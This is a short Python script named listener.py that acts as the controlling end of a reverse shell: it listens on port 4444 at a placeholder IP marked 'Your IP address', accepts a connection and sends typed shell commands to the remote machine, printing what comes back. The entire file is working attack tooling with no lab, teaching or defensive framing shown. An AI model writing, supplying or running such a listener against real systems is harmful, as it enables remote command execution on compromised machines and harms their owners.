# listener.py
import socket

HOST = "10.12.74.209"  # Your IP address
PORT = 4444             # Port to listen on

def start_listener():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT))
        s.listen()
        print(f"Listening on {HOST}:{PORT}...")
        conn, addr = s.accept()
        with conn:
            print(f"Connected by {addr}")
            while True:
                command = input("shell> ")
                if command.lower() == "exit":
                    conn.send(command.encode())
                    break
                conn.send(command.encode())
                output = conn.recv(1024).decode()
                print(output)

if __name__ == "__main__":
    start_listener()